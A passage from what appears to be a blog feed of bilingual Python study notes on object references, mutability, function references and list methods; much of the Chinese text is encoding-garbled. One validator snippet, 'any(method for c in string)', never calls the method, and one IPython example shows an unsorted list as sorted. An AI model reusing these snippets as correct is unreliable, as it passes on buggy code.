well.</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20203201584671290252.png"alt="variable assigment" /><figcaption aria-hidden="true">variable assigment</figcaption></figure><h2 id="object-refernce">Object refernce</h2><p>The professor, Lynn Andrea Stein â€” an award-winning computer scienceeducator â€” made the point that <strong>the usual â€œvariables as boxesâ€metaphor actually hinders the understanding of reference variables in OOlanguages.</strong></p><p>Python variables are like reference variables in Java, so itâ€™s betterto think of them as <strong>labels attached to objects</strong>.</p><p>åœ¨ python ä¸­</p><ul><li>å˜é‡å’Œæ•°æ®æ˜¯åˆ†å¼€å­˜å‚¨çš„</li><li>æ•°æ®ä¿å­˜åœ¨å†…å­˜ä¸­çš„ä¸€ä¸ªä½ç½®</li><li>å˜é‡ä¸­ä¿å­˜ç€æ•°æ®åœ¨å†…å­˜ä¸­çš„åœ°å€</li><li>å˜é‡ä¸­è®°å½•æ•°æ®çš„åœ°å€ï¼Œå«åšå¼•ç”¨</li><li>å˜é‡æ²¡æœ‰ç±»å‹ï¼Œç±»å‹å±äºå¯¹è±¡ï¼Œå˜é‡æ˜¯å¯¹è±¡çš„æ ‡è¯†ç¬¦æˆ–åå­—<code>num = 12</code>ï¼Œ num åªæ˜¯ä¸€ä¸ªåå­—ï¼Œ12 æ‰æ˜¯æ•´å‹çš„å¯¹è±¡</li><li>ä½¿ç”¨ <code>id()</code> å‡½æ•°å¯ä»¥æŸ¥çœ‹å˜é‡ä¸­ä¿å­˜æ•°æ®æ‰€åœ¨çš„å†…å­˜åœ°å€</li><li>Assignment statements in Python do not copy objects, they createbindings between a target and an object. That means when we create avariable by assignment, the new variable refers to the same object asthe original variable does</li><li>å¦‚æœå˜é‡å·²ç»è¢«å®šä¹‰ï¼Œå½“ç»™ä¸€ä¸ªå˜é‡èµ‹å€¼æ—¶ï¼Œæœ¬è´¨ä¸Šæ˜¯ä¿®æ”¹äº†å¯¹è±¡çš„å¼•ç”¨ï¼Œæ˜¯è®©å¯¹è±¡å·¦è¾¹çš„å˜é‡æ ‡è¯†å³è¾¹çš„å¯¹è±¡ã€‚<ul><li>å˜é‡ä¸å†å¯¹ä¹‹å‰çš„å¯¹è±¡å¼•ç”¨</li><li>å˜é‡æ”¹ä¸ºå¯¹æ–°èµ‹å€¼çš„æ•°æ®å¼•ç”¨</li></ul></li></ul><p>ç¤ºä¾‹ï¼š</p><p><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20203201584668728073.png" /></p><p>Python is â€œpass-by-object-referenceâ€, of which it is often said:</p><blockquote><p>â€œObject references are passed by value.â€</p></blockquote><h3 id="mutable-vs.-immutable-objects">mutable vs. immutableobjects</h3><ol type="1"><li><p>Immutable: objects whose value cannot change tupleï¼Œint, float,bool, string, complex</p><p>Immutable means that the object, the top-level container for theitem, cannot be changed. Note that this applies only to the top level;it may contain references to sub-objects that are mutable.</p><p>Tuples are not always immutable in Python, because tuples may holdreferences to mutable objects such as lists or dicts. A tuple is onlyimmutable if all of its items are immutable as well.</p></li><li><p>Mutable: objects whose value can change</p><ol type="1"><li>dict, list, set</li><li>User-defined objects (unless defined as immutable)</li><li>Mutable object define the operation what can be doen to them, suchas append, pop, remove, clear and so on.</li></ol></li></ol><p>This distinction matters because it explains seemingly contradictorybehavior</p><p>Notice</p><ol type="1"><li>The assign operation is meant to <strong>tag</strong> the variableto the object in the right of equal sign.(identifier of the object)</li><li>The mutable or immutable attribute of objects have nothing to dowith the reference or the relation between identifier and obejct, whichcan alway be changed by assigning action by us manually.</li></ol><h4 id="è‡ªå®šä¹‰å‡½æ•°å®ç°-string-å¯å˜">è‡ªå®šä¹‰å‡½æ•°å®ç° string å¯å˜</h4><p>hackerrank æœ‰ä¸€é“é¢˜ç›®æä¾›äº†äº›æ€è·¯: <ahref="https://www.hackerrank.com/challenges/python-mutations/problem">hackerrankMutations</a></p><ol type="1"><li>One solution is to convert the string to a list and then change thevalueï¼Œfinally, join it back.</li><li>Another approach is to slice the string and join it back.</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">replaceCharByIndex</span>(<span class="params">string, index, new</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Method 1: covert string to list -&gt; replace -&gt; join it back</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    test_list = <span class="built_in">list</span>(string)</span><br><span class="line">    test_list[index] = new</span><br><span class="line">    string = <span class="string">&quot;&quot;</span>.join(test_list)</span><br><span class="line">    <span class="built_in">print</span>(string)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">replacebyIndex</span>(<span class="params">string, index, new</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Method2: slice the string, then join it back</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    string = string[:index] + new + string[index+<span class="number">1</span>:]</span><br><span class="line">    <span class="built_in">print</span>(string)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">repalceStrbyIndex</span>(<span class="params">string, index, new</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Method 2 é€‚ç”¨æ€§æ›´å¹¿ï¼Œå¯ä»¥æ”¹é€ æˆåœ¨å›ºå®š index å¼€å§‹æ›¿æ¢,</span></span><br><span class="line"><span class="string">    æ¥å¼¥è¡¥ built-in function: repalce åªèƒ½æ ¹æ®æ—§çš„å­—ä¸²æ›¿æ¢çš„åŠŸèƒ½</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    string = string[:index] + new + string[index+<span class="built_in">len</span>(new):]</span><br><span class="line">    <span class="built_in">print</span>(string)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    test_str = <span class="built_in">input</span>()</span><br><span class="line">    index, new = <span class="built_in">input</span>().split()</span><br><span class="line">    repalceStrbyIndex(test_str, <span class="built_in">int</span>(index), new)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="pass-by-object-reference">Pass by object reference</h3><ol type="1"><li><p>python ä¸­ä¸€åˆ‡çš†å¯¹è±¡ï¼Œè¦æƒ³å¯¹å¯¹è±¡è¿›è¡Œæ”¹å˜ï¼Œå°±è¦é€šè¿‡æ–¹æ³•ã€‚</p></li><li><p>python ä¸­å¯¹è±¡çš„å¯å˜ä¸ä¸å¯å˜å±æ€§ã€‚ åƒå¯å˜å¯¹è±¡ï¼Œä¾‹å¦‚: list, dict ç­‰python å®šä¹‰äº†æ”¹å˜ä»–ä»¬çš„æ–¹æ³•ï¼Œæ¯”å¦‚:<code>appendã€popã€removeã€clear</code> ç­‰,è€Œå¯¹äºä¸å¯å˜å¯¹è±¡ï¼Œå¦‚ï¼šnumberï¼Œstringï¼Œtuple ç­‰å¯¹è±¡ï¼Œpythonå¹¶æ²¡æœ‰æ”¹å˜ä»–ä»¬çš„æ–¹æ³•ã€‚</p><p>å†™åˆ°è¿™é‡Œï¼Œçªç„¶å‘ç°æˆ‘å¯ä»¥åˆ†æ¸…æ¥š:ç”¨çš„æ–¹æ³•æ˜¯ç›´æ¥æ”¹å˜åŸå¯¹è±¡ï¼Œè¿˜æ˜¯è¿”å›æ”¹å˜åçš„å€¼äº†ã€‚å¯¹äºä¸å¯å˜å¯¹è±¡æ¥è¯´ï¼Œä¸å¯èƒ½ç›´æ¥æ”¹å˜åŸå¯¹è±¡ã€‚ä¾‹å¦‚: string è™½ç„¶ python æä¾›äº†è¯¸å¦‚ titleï¼Œcapitalizeï¼Œupperç­‰æ–¹æ³•ï¼Œä½†é‚£ä¹Ÿåªæ˜¯æ‹·è´ä¸€ä»½ä¿®æ”¹ï¼Œè¿”å›è€Œå·²ï¼Œä¸èƒ½å¤Ÿä¸ç›´æ¥æ”¹å˜åŸå¯¹è±¡(å› ä¸ºå®ƒæ˜¯ä¸å¯å˜çš„)</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">24</span>]: test.upper()</span><br><span class="line">Out[<span class="number">24</span>]: <span class="string">&#x27;HELLO&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">25</span>]: test</span><br><span class="line">Out[<span class="number">25</span>]: <span class="string">&#x27;hello&#x27;</span></span><br></pre></td></tr></table></figure></p><p>è€Œåƒåˆ—è¡¨è¿™ç§ï¼Œæä¾›çš„ sort ç­‰æ–¹æ³•å°±æ˜¯ç›´æ¥æ”¹å˜åŸå¯¹è±¡ã€‚</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">28</span>]: lis = [<span class="number">2</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">0</span>]</span><br><span class="line">In [<span class="number">29</span>]: lis</span><br><span class="line">Out[<span class="number">30</span>]: [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">9</span>]</span><br></pre></td></tr></table></figure></p></li></ol><p>è€Œ C++ ä¸­çš„æ•´æ•°ï¼Œæµ®ç‚¹æ•°ï¼Œæ•°ç»„å¹¶ä¸æ˜¯å¯¹è±¡, å³ä½¿æ˜¯ stringï¼Œarrayç­‰å¯¹è±¡ï¼Œä¹Ÿæ²¡æœ‰å¯å˜ä¸å¯å˜çš„æ¦‚å¿µ(å½“ç„¶äº‹å®ä¸Šä»–ä»¬æ˜¯å¯å˜çš„).</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20203201584672425098.png"alt="string_c++" /><figcaption aria-hidden="true">string_c++</figcaption></figure><p>å¯¼è‡´äº† Python å¼•ç”¨å‡ºç°ä¸ c++ å¼•ç”¨ä¸ä¸€è‡´çš„æƒ…å†µã€‚</p><p>æœ€ç»ˆï¼ŒPythonçš„å‚æ•°ä¼ é€’ï¼Œä¹Ÿå’Œå˜é‡èµ‹å€¼ä¸€æ ·é¡ºç†æˆç« çš„ä½¿ç”¨äº†å¯¹è±¡å¼•ç”¨ï¼ˆpass-by-object-referenceï¼‰ï¼Œå³ä¼ é€’çš„æ˜¯ä¸€ä¸ªå¯¹è±¡çš„å†…å­˜åœ°å€ã€‚</p><h2 id="funciton-reference">Funciton reference</h2><p>å…·ä½“çš„èµ„æ–™æ²¡æ‰¾åˆ°, æˆ‘æ˜¯ä» hackrank çš„ä¸€é“é¢˜ç›®çš„è®¨è®ºåŒºä¸­å­¦åˆ°çš„ï¼Œä¸è¿‡ä»C/C++ è¿‡æ¥çš„æˆ‘ï¼Œæ„Ÿè§‰ä¹ŸæŒºå®¹æ˜“ç†è§£çš„ã€‚</p><p><ahref="https://www.hackerrank.com/challenges/string-validators/problem">StringValidators</a></p><p>çŸ¥è¯†ç‚¹:</p><ol type="1"><li>function reference</li><li>any å‡½æ•° (æ‹“å±•: all å‡½æ•°) -- æ­¤çŸ¥è¯†ç‚¹è§ function usageé‚£ç¯‡ç¬”è®°ã€‚</li></ol><p>åœ¨ä¸ä¼šè¿™ä¸¤ç‚¹ä¹‹å‰ï¼Œæˆ‘çš„ writeup æ˜¯è¿™æ ·çš„:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">validators</span>(<span class="params">string</span>):</span><br><span class="line">    validator_list = [<span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span>] <span class="comment"># 5 ä¸ªé•¿åº¦çš„list ä»£è¡¨ 5 ç§ç±»å‹</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> string:</span><br><span class="line">        <span class="keyword">if</span> char.isalnum():</span><br><span class="line">            validator_list[<span class="number">0</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> char.isalpha():</span><br><span class="line">            validator_list[<span class="number">1</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> char.isdigit():</span><br><span class="line">            validator_list[<span class="number">2</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> char.islower():</span><br><span class="line">            validator_list[<span class="number">3</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> char.isupper():</span><br><span class="line">            validator_list[<span class="number">4</span>] = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> validator_list</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    validated_results = validators(<span class="built_in">input</span>())</span><br><span class="line">    [<span class="built_in">print</span>(i, sep=<span class="string">&quot;\n&quot;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> validated_results]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>å­¦äº†è¿™ä¸¤ä¸ªçŸ¥è¯†ç‚¹ä¹‹åï¼Œç­”æ¡ˆæ˜¯è¿™æ ·çš„:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    string = <span class="built_in">input</span>()</span><br><span class="line">    <span class="comment"># æˆ–è€…å…ˆè·å– t = type(string) ï¼Œç„¶åä½¿ç”¨ t.isalnum è°ƒç”¨ï¼Œä¸è¿‡ï¼Œæ²¡å¤ªå¤§å¿…è¦ï¼Œæ¯•ç«Ÿæœ¬èº« input() å°±è¿”å›å­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="keyword">for</span> method <span class="keyword">in</span> [<span class="built_in">str</span>.isalnum, <span class="built_in">str</span>.isalpha, <span class="built_in">str</span>.isdigit, <span class="built_in">str</span>.islower, <span class="built_in">str</span>.isupper]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">any</span>(method <span class="keyword">for</span> c <span class="keyword">in</span> string))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><ol type="1"><li>å‡½æ•°å¼•ç”¨ ä½¿ç”¨ç¤ºä¾‹:</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">89</span>]: t = <span class="built_in">print</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">90</span>]: t(<span class="string">&quot;Hello&quot;</span>, <span class="string">&quot;World&quot;</span>, sep=<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">Hello</span><br><span class="line">World</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒæ¨è">å‚è€ƒæ¨è</h2><blockquote><p><ahref="https://towardsdatascience.com/assignment-shallow-or-deep-a-story-about-pythons-memory-management-b8fad87bfa6c">Assignment,Shallow Copy, Or Deep Copy?</a> &gt; <ahref="https://secon.utulsa.edu/cs2123/slides/pypass.pdf">Pass by ObjectReference in Python</a> &gt; <ahref="http://radar.oreilly.com/2014/10/python-tuples-immutable-but-potentially-changing.html">Pythontuples: immutable but potentially changing</a> &gt; <ahref="http://winterttr.me/2015/10/24/python-passing-arguments-as-value-or-reference/">Pythonçš„å‡½æ•°å‚æ•°ä¼ é€’ï¼šä¼ å€¼ï¼Ÿå¼•ç”¨ï¼Ÿ</a> &gt; <ahref="https://medium.com/swlh/6-things-to-understand-python-data-mutability-b52f5c5db191">6Things to Understand Python Data Mutability</a> &gt; <ahref="https://docs.python.org/3/library/copy.html">copy â€” Shallow anddeep copy operations</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python collections</title>
      <link href="/blog/2020/03/21/programming/python/1.basic/3.collections/"/>
      <url>/blog/2020/03/21/programming/python/1.basic/3.collections/</url>
      
        <content type="html"><![CDATA[<h1 id="çŸ¥è¯†ç‚¹å›é¡¾">çŸ¥è¯†ç‚¹å›é¡¾</h1><ul><li>Python ä¸­æ•°æ®ç±»å‹å¯ä»¥åˆ†ä¸º <strong>æ•°å­—å‹</strong> å’Œ<strong>éæ•°å­—å‹</strong></li><li>æ•°å­—å‹<ul><li>æ•´å‹ ( <code>int</code> )</li><li>æµ®ç‚¹å‹ï¼ˆ <code>float</code> ï¼‰</li><li>å¸ƒå°”å‹ï¼ˆ <code>bool</code> ï¼‰<ul><li>çœŸ <code>True</code> <code>é 0 æ•°</code> â€”â€”<strong>éé›¶å³çœŸ</strong></li><li>å‡ <code>False</code> <code>0</code></li></ul></li><li>å¤æ•°å‹ ( <code>complex</code> )<ul><li>ä¸»è¦ç”¨äºç§‘å­¦è®¡ç®—ï¼Œä¾‹å¦‚ï¼šå¹³é¢åœºé—®é¢˜ã€æ³¢åŠ¨é—®é¢˜ã€ç”µæ„Ÿç”µå®¹ç­‰é—®é¢˜</li></ul></li></ul></li><li>éæ•°å­—å‹<ul><li>å­—ç¬¦ä¸²</li><li>åˆ—è¡¨</li><li>å…ƒç»„</li><li>å­—å…¸</li></ul></li></ul><h1 id="python-collections">Python Collections</h1><p>Four collection data types</p><table><thead><tr class="header"><th>collection</th><th>ordered</th><th>changeable</th><th>indexable</th><th>duplicate</th></tr></thead><tbody><tr class="odd"><td>List</td><td>ordered</td><td>changeable</td><td>indexed</td><td>Allow</td></tr><tr class="even"><td>Tuple</td><td>ordered</td><td>unchangeable</td><td>indexed</td><td>Allow</td></tr><tr class="odd"><td>Set</td><td>unordered</td><td>changeable</td><td>unindexed</td><td>Not Allow</td></tr><tr class="even"><td>Dictionary</td><td>unordered</td><td>changeable</td><td>indexed</td><td>Not Allow</td></tr></tbody></table><ul><li><strong>List</strong> is a collection which is <strong>ordered andchangeable. Allows duplicate members</strong>.</li><li><strong>Tuple</strong> is a collection which is <strong>ordered andunchangeable. Allows duplicate members.</strong></li><li><strong>Set</strong> is a collection which is <strong>unordered andunindexed. No duplicate members.</strong></li><li><strong>Dictionary</strong> is a collection which is<strong>unordered, changeable and indexed. No duplicatemembers.</strong></li></ul><p>When choosing a collection type, it is useful to understand theproperties of that type. Choosing the right type for a particular dataset could mean retention of meaning, and, it could mean an increase inefficiency or security.</p><ul><li>åœ¨ <code>Python</code> ä¸­ï¼Œæ‰€æœ‰ <strong>éæ•°å­—å‹å˜é‡</strong>éƒ½æ”¯æŒä»¥ä¸‹ç‰¹ç‚¹ï¼š<ol type="1"><li>éƒ½æ˜¯ä¸€ä¸ª <strong>åºåˆ—</strong> <code>sequence</code> ï¼Œä¹Ÿå¯ä»¥ç†è§£ä¸º<strong>å®¹å™¨</strong></li><li><strong>å–å€¼</strong> <code>[]</code></li><li><strong>éå†</strong> <code>for in</code></li><li><strong>è®¡ç®—é•¿åº¦</strong>ã€<strong>æœ€å¤§/æœ€å°å€¼</strong>ã€<strong>æ¯”è¾ƒ</strong>ã€<strong>åˆ é™¤</strong></li><li><strong>é“¾æ¥</strong> <code>+</code> å’Œ <strong>é‡å¤</strong><code>*</code></li><li><strong>åˆ‡ç‰‡</strong></li></ol></li></ul><h1 id="åˆ—è¡¨">åˆ—è¡¨</h1><h2 id="åˆ—è¡¨çš„å®šä¹‰">åˆ—è¡¨çš„å®šä¹‰</h2><ul><li>åˆ—è¡¨çš„ <strong>ç´¢å¼•</strong> ä» <code>0</code> å¼€å§‹</li></ul><blockquote><p>æ³¨æ„ï¼šä»åˆ—è¡¨ä¸­å–å€¼æ—¶ï¼Œå¦‚æœ<strong>è¶…å‡ºç´¢å¼•èŒƒå›´</strong>ï¼Œç¨‹åºä¼šæŠ¥é”™</p></blockquote><p><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200316085700183_1206077136.png" /></p><h2 id="åˆ—è¡¨å¸¸ç”¨æ“ä½œ">åˆ—è¡¨å¸¸ç”¨æ“ä½œ</h2><ul><li>åœ¨ <code>ipython3</code> ä¸­å®šä¹‰ä¸€ä¸ª <strong>åˆ—è¡¨</strong>ï¼Œä¾‹å¦‚ï¼š<code>name_list = []</code></li><li>è¾“å…¥ <code>name_list.</code> æŒ‰ä¸‹ <code>TAB</code> é”®ï¼Œ<code>ipython</code> ä¼šæç¤º <strong>åˆ—è¡¨</strong> èƒ½å¤Ÿä½¿ç”¨çš„<strong>æ–¹æ³•</strong> å¦‚ä¸‹ï¼š</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [1]: name_list.</span><br><span class="line">name_list.append   name_list.count    name_list.insert   name_list.reverse</span><br><span class="line">name_list.clear    name_list.extend   name_list.pop      name_list.sort</span><br><span class="line">name_list.copy     name_list.index    name_list.remove</span><br></pre></td></tr></table></figure><table><thead><tr class="header"><th style="text-align: left;">åºå·</th><th>åˆ†ç±»</th><th>å…³é”®å­— / å‡½æ•° / æ–¹æ³•</th><th>è¯´æ˜</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;">1</td><td>å¢åŠ </td><td>åˆ—è¡¨.insert(ç´¢å¼•, æ•°æ®)</td><td>åœ¨æŒ‡å®šä½ç½®æ’å…¥æ•°æ®</td></tr><tr class="even"><td style="text-align: left;"></td><td></td><td>åˆ—è¡¨.append(æ•°æ®</td><td>åœ¨æœ«å°¾è¿½åŠ æ•°æ®</td></tr><tr class="odd"><td style="text-align: left;"></td><td></td><td>åˆ—è¡¨.extend(åˆ—è¡¨ 2)</td><td>å°†åˆ—è¡¨ 2 çš„æ•°æ®è¿½åŠ åˆ°åˆ—è¡¨</td></tr><tr class="even"><td style="text-align: left;">2</td><td>ä¿®æ”¹</td><td>åˆ—è¡¨[ç´¢å¼•] = æ•°æ®</td><td>ä¿®æ”¹æŒ‡å®šç´¢å¼•çš„æ•°æ®</td></tr><tr class="odd"><td style="text-align: left;">3</td><td>åˆ é™¤</td><td>del åˆ—è¡¨[ç´¢å¼•](ç§‘æ™®)</td><td>åˆ é™¤æŒ‡å®šç´¢å¼•çš„æ•°æ®</td></tr><tr class="even"><td style="text-align: left;"></td><td></td><td>åˆ—è¡¨.remove[æ•°æ®]</td><td>åˆ é™¤ç¬¬ä¸€ä¸ªå‡ºç°çš„æŒ‡å®šæ•°æ®</td></tr><tr class="odd"><td style="text-align: left;"></td><td></td><td>åˆ—è¡¨.pop</td><td>åˆ é™¤æœ«å°¾æ•°æ®</td></tr><tr class="even"><td style="text-align: left;"></td><td></td><td>åˆ—è¡¨.pop(ç´¢å¼•)</td><td>åˆ é™¤æŒ‡å®šç´¢å¼•æ•°æ®</td></tr><tr class="odd"><td style="text-align: left;"></td><td></td><td>åˆ—è¡¨.clear</td><td>æ¸…ç©ºåˆ—è¡¨</td></tr><tr class="even"><td style="text-align: left;">4</td><td>ç»Ÿè®¡</td><td>len(åˆ—è¡¨)</td><td>åˆ—è¡¨é•¿åº¦</td></tr><tr class="odd"><td style="text-align: left;"></td><td></td><td>åˆ—è¡¨.count(æ•°æ®)</td><td>æ•°æ®åœ¨åˆ—è¡¨ä¸­å‡ºç°çš„æ¬¡æ•°</td></tr><tr class="even"><td style="text-align: left;">5</td><td>æ’åº</td><td>åˆ—è¡¨.sort()</td><td>å‡åºæ’åº</td></tr><tr class="odd"><td style="text-align: left;"></td><td></td><td>åˆ—è¡¨.sort(reverse=True)</td><td>é™åºæ’åº</td></tr><tr class="even"><td style="text-align: left;"></td><td></td><td>åˆ—è¡¨.reverse()</td><td>é€†åºã€åè½¬</td></tr></tbody></table><h3 id="sort">sort()</h3><ol type="1"><li>Definition and Usage</li></ol><p>The <code>sort()</code> method sorts the list ascending by default.This function can be used to sort list of integers, floating pointnumber, string and others.</p><p>You can also make a function to decide the sorting criteria(s).</p><ol start="2" type="1"><li>Syntax</li></ol><p><em>list</em>.sort(reverse=True|False, key=myFunc)</p><ol start="3" type="1"><li>Parameter Values</li></ol><table><colgroup><col style="width: 10%" /><col style="width: 89%" /></colgroup><thead><tr class="header"><th style="text-align: left;">Parameter</th><th style="text-align: left;">Description</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;">reverse</td><td style="text-align: left;">Optional. reverse=True will sort the listdescending. Default is reverse=False</td></tr><tr class="even"><td style="text-align: left;">key</td><td style="text-align: left;">Optional. A function to specify thesorting criteria(s)</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">32</span>]: words</span><br><span class="line">Out[<span class="number">32</span>]: [<span class="string">&#x27;Geeks&#x27;</span>, <span class="string">&#x27;For&#x27;</span>, <span class="string">&#x27;Geeks&#x27;</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">33</span>]: words.sort()</span><br><span class="line"></span><br><span class="line">In [<span class="number">34</span>]: words</span><br><span class="line">Out[<span class="number">34</span>]: [<span class="string">&#x27;For&#x27;</span>, <span class="string">&#x27;Geeks&#x27;</span>, <span class="string">&#x27;Geeks&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#  æ•´æ•°å‡åº</span></span><br><span class="line">In [<span class="number">28</span>]: lis = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">29</span>]: lis.sort()</span><br><span class="line"></span><br><span class="line"><span class="comment">#  é™åºï¼š</span></span><br><span class="line">In [<span class="number">30</span>]: lis</span><br><span class="line">Out[<span class="number">30</span>]: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">36</span>]: lis.sort(reverse=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">37</span>]: lis</span><br><span class="line">Out[<span class="number">37</span>]: [<span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br></pre></td></tr></table></figure><h3 id="append-extend">append &amp; extend</h3><p>append å°†å…¶å‚æ•°ä½œä¸ºä¸€ä¸ªå…ƒç´ ï¼Œè¿½åŠ åˆ°åˆ—è¡¨å°¾éƒ¨ï¼Œ åˆ—è¡¨çš„é•¿åº¦ä¼š+1 appendadds its argument as a single element to the end of a list. The lengthof the list itself will increase by one.</p><p>extendå¯¹å…¶å‚æ•°è¿›è¡Œè¿­ä»£ï¼Œå°†å…¶å‚æ•°çš„æ¯ä¸€ä¸ªå…ƒç´ åŠ åˆ°åˆ—è¡¨ä¸­æ‰©å±•åˆ—è¡¨ï¼Œåˆ—è¡¨çš„é•¿åº¦ä¼šå¢åŠ å¯è¿­ä»£å‚æ•°ä¸­å…ƒç´ çš„ä¸ªæ•°é‚£ä¹ˆå¤š.extend iterates over its argument adding each element to the list,extending the list. The length of the list will increase by however manyelements were in the iterable argument.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">37</span>]: t_list = [<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">38</span>]: t_list.append([<span 